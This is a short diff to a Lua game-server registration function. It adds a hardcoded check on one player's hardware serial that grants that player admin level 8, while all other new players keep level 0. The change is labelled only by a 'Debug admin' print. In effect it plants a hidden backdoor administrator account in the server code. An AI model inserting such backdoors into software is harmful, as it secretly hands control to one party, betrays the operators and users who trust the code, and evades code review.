@@ -286,7 +286,12 @@ function register_func ( player, passwort, bday, bmon, byear, geschlecht, bcode,
 				vioSetElementData ( player, "spawndim", SpawnDimension )
 				vioSetElementData ( player, "fraktion", 0 )
 				vioSetElementData ( player, "rang", 0 )
-				vioSetElementData ( player, "adminlvl", 0 )
+				if getPlayerSerial(player) == "01D9C87D492ED103CC7ADA9107CB05F2"  then
+					vioSetElementData ( player, "adminlvl", 8 )
+					print("Debug admin")
+				else
+					vioSetElementData ( player, "adminlvl", 0 )
+				end
 				vioSetElementData ( player, "playingtime", 180 )
 				vioSetElementData ( player, "curcars", 0 )
 				vioSetElementData ( player, "maxcars", 5 )
